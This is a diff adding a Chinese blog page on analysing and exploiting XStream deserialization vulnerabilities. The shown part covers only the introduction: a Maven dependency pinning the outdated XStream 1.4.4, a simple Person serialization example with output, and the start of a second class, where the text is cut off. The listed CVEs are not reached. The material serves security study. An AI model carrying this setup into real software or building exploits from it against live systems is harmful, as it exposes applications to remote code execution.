@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dililearngent.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-1}},"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="XStream组件的相关利用链及相关漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之XStream漏洞分析与利用">
+<meta property="og:url" content="https://dililearngent.github.io/2023/04/24/XStream/index.html">
+<meta property="og:site_name" content="DiliLearngent&#39;s Blog">
+<meta property="og:description" content="XStream组件的相关利用链及相关漏洞分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718154510.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718153716.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718160733.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718160815.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719193632.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719200939.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719202237.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719210542.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719205925.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230720154132.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230720153920.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230720155445.png">
+<meta property="article:published_time" content="2023-04-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-07-24T16:00:00.000Z">
+<meta property="article:author" content="DiliLearngent">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718154510.png">
+
+
+<link rel="canonical" href="https://dililearngent.github.io/2023/04/24/XStream/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://dililearngent.github.io/2023/04/24/XStream/","path":"2023/04/24/XStream/","title":"Java安全之XStream漏洞分析与利用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之XStream漏洞分析与利用 | DiliLearngent's Blog</title>
+  
+
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">DiliLearngent's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人要終於年輕時候的夢想！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">反序列化分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB"><span class="nav-number">3.</span> <span class="nav-text">漏洞汇总</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2021-21344"><span class="nav-number">4.</span> <span class="nav-text">CVE-2021-21344</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2013-7258"><span class="nav-number">5.</span> <span class="nav-text">CVE-2013-7258</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2021-21351"><span class="nav-number">6.</span> <span class="nav-text">CVE-2021-21351</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B2%E6%8A%A4"><span class="nav-number">7.</span> <span class="nav-text">防护</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="DiliLearngent"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">DiliLearngent</p>
+  <div class="site-description" itemprop="description">保持热爱!</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/DiliLearngent" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DiliLearngent" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+<div style="">
+  <canvas id="canvas" style="width:60%;">当前浏览器不支持canvas，请更换浏览器后再试</canvas>
+</div>
+<script>
+(function(){
+
+   var digit=
+    [
+        [
+            [0,0,1,1,1,0,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,0,1,1,0],
+            [0,0,1,1,1,0,0]
+        ],//0
+        [
+            [0,0,0,1,1,0,0],
+            [0,1,1,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [1,1,1,1,1,1,1]
+        ],//1
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,1,1],
+            [1,1,1,1,1,1,1]
+        ],//2
+        [
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//3
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,0],
+            [0,0,1,1,1,1,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,1,1,0],
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,1]
+        ],//4
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,1,1,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//5
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//6
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0]
+        ],//7
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//8
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,1,1,0,0,0,0]
+        ],//9
+        [
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0]
+        ]//:
+    ];
+
+var canvas = document.getElementById('canvas');
+
+if(canvas.getContext){
+    var cxt = canvas.getContext('2d');
+    //声明canvas的宽高
+    var H = 100,W = 700;
+    canvas.height = H;
+    canvas.width = W;
+    cxt.fillStyle = '#f00';
+    cxt.fillRect(10,10,50,50);
+
+    //存储时间数据
+    var data = [];
+    //存储运动的小球
+    var balls = [];
+    //设置粒子半径
+    var R = canvas.height/20-1;
+    (function(){
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成
+        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+    })();
+
+    /*生成点阵数字*/
+    function renderDigit(index,num){
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    cxt.beginPath();
+                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);
+                    cxt.closePath();
+                    cxt.fill();
+                }
+            }
+        }
+    }
+
+    /*更新时钟*/
+    function updateDigitTime(){
+        var changeNumArray = [];
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        var NewData = [];
+        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+        for(var i = data.length-1; i >=0 ; i--){
+            //时间发生变化
+            if(NewData[i] !== data[i]){
+                //将变化的数字值和在data数组中的索引存储在changeNumArray数组中
+                changeNumArray.push(i+'_'+(Number(data[i])+1)%10);
+            }
+        }
+        //增加小球
+        for(var i = 0; i< changeNumArray.length; i++){
+            addBalls.apply(this,changeNumArray[i].split('_'));
+        }
+        data = NewData.concat();
+    }
+
+    /*更新小球状态*/
+    function updateBalls(){
+        for(var i = 0; i < balls.length; i++){
+            balls[i].stepY += balls[i].disY;
+            balls[i].x += balls[i].stepX;
+            balls[i].y += balls[i].stepY;
+            if(balls[i].x > W + R || balls[i].y > H + R){
+                balls.splice(i,1);
+                i--;
+            }
+        }
+    }
+
+    /*增加要运动的小球*/
+    function addBalls(index,num){
+        var numArray = [1,2,3];
+        var colorArray =  ["#3BE","#09C","#A6C","#93C","#9C0","#690","#FB3","#F80","#F44","#C00"];
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    var ball = {
+                        x:14*(R+2)*index + j*2*(R+1)+(R+1),
+                        y:i*2*(R+1)+(R+1),
+                        stepX:Math.floor(Math.random() * 4 -2),
+                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],
+                        color:colorArray[Math.floor(Math.random()*colorArray.length)],
+                        disY:1
+                    };
+                    balls.push(ball);
+                }
+            }
+        }
+    }
+
+    /*渲染*/
+    function render(){
+        //重置画布宽度，达到清空画布的效果
+        canvas.height = 100;
+        //渲染时钟
+        for(var i = 0; i < data.length; i++){
+            renderDigit(i,data[i]);
+        }
+        //渲染小球
+        for(var i = 0; i < balls.length; i++){
+            cxt.beginPath();
+            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);
+            cxt.fillStyle = balls[i].color;
+            cxt.closePath();
+            cxt.fill();
+        }
+    }
+
+    clearInterval(oTimer);
+    var oTimer = setInterval(function(){
+        //更新时钟
+        updateDigitTime();
+        //更新小球状态
+        updateBalls();
+        //渲染
+        render();
+    },50);
+}
+
+})();
+</script>
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://dililearngent.github.io/2023/04/24/XStream/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="DiliLearngent">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DiliLearngent's Blog">
+      <meta itemprop="description" content="保持热爱!">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之XStream漏洞分析与利用 | DiliLearngent's Blog">
+      <meta itemprop="description" content="XStream组件的相关利用链及相关漏洞分析">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之XStream漏洞分析与利用
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-04-25 00:00:00" itemprop="dateCreated datePublished" datetime="2023-04-25T00:00:00+08:00">2023-04-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-07-25 00:00:00" itemprop="dateModified" datetime="2023-07-25T00:00:00+08:00">2023-07-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>16 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">XStream组件的相关利用链及相关漏洞分析</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>官方文档描述：</p>
+<blockquote>
+<p>XStream is designed to be an easy to use library. It takes its main task seriously: converting Java objects to XML, and XML to Java objects. As a result, it is possible to create an instance of XStream with the default constructor, call a method to convert an object into XML, then call another method to turn the XML back into an equivalent Java object. By design, there are few limits to the type of objects XStream can handle.</p>
+<p>简单来说，XStream是一个能将Java对象和XML相互转换的Java库。</p>
+</blockquote>
+<p>导入Maven依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>示例1</strong>：Java对象没有实现反序列化接口并重写readObject方法<br>Person类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstreamTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;lucy&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        System.out.print(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Xstream.Person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>lucy<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>22<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Xstream.Person</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>示例2</strong>：Java对象继承了反序列化接口并重写了readObject方法<br>Car类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 